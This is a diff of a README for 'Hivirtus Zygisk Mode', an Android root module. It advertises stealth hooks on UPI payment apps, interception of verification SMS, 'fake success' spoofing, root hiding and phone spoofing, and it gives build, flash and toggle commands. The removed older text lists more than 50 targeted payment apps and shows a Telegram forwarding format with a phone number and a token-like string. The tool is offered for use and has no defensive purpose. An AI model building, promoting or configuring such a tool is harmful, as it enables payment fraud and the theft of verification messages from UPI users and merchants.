@@ -1,40 +1,32 @@
-# Hivirtus Zygisk Mode v2.9.0
+# Hivirtus Zygisk Mode v2.15.0
 
-## UPI Apps Hook + Telegram Token (Screenshot Format)
+**Pure Zygisk floating module — koi APK nahi. UI = local HTML.**
 
-### UPI Tab — 50+ Apps
-PhonePe, Paytm, YesPay, Snapmint, Tata Neu, Stashfin, KreditBee, CRED, aur sab UPI apps A-Z.
+## Features
+- Draggable bubble + **HTML/CSS WebView menu** (modern, smooth, offline)
+- SMS intercept + fake success
+- Root hide, phone spoof, UPI hooks
+- 100% local `config.json`
 
-- **Select All / Deselect All**
-- Per-app toggle — jo select karo sirf unme stealth hook
-- **Hook SMS Verification** — UPI SMS auto capture
-- **Save UPI Hooks**
-
-### Telegram Format (Same as screenshot)
-```
-📱 Zygisk Menu
-Mode By @hivirtus @liqdy
-────────────────
-📞 To: +919211228947
-💬 Message: YESPRODUPI
-ppuEHZ0DauJc0g4xm-G7M)4CxwMb&uZJx?jJp +919211228947
-```
-
-### Works On All Root
-Magisk | KernelSU | KernelSU Next | APatch | SukiSU Ultra
-
-### Install
-**Ready zip (no build needed):**
-```
-releases/hivirtus_zygisk_mode-v2.9.0.zip
-```
-
-**Or build yourself:**
+## Install
 ```bash
+export ANDROID_HOME=... ANDROID_NDK=...
 ./build.sh
-# → hivirtus_zygisk_mode-v2.9.0.zip
-./build-app.sh
-# → overlay-app/app/build/outputs/apk/release/app-release.apk
+# Flash zip → Reboot → Zygisk ON → bubble tap
 ```
 
-Flash → Reboot → Overlay APK → UPI tab → Select apps → Telegram tab → Save
+## Docs (Hinglish)
+1. [Install](docs/phase-01-install.md)
+2. [Floating HTML UI](docs/phase-02-floating-window.md)
+3. [SMS Intercept](docs/phase-03-sms-intercept.md)
+4. [Local Config](docs/phase-04-local-config.md)
+5. [Build & Size](docs/phase-05-build-size.md)
+6. [HTML UI Edit](docs/phase-06-html-ui.md)
+
+## Shell
+```bash
+hivirtus-menu status
+hivirtus-menu toggle intercept_fake_success
+```
+
+Works on: Magisk | KernelSU | APatch | SukiSU (Zygisk ON)
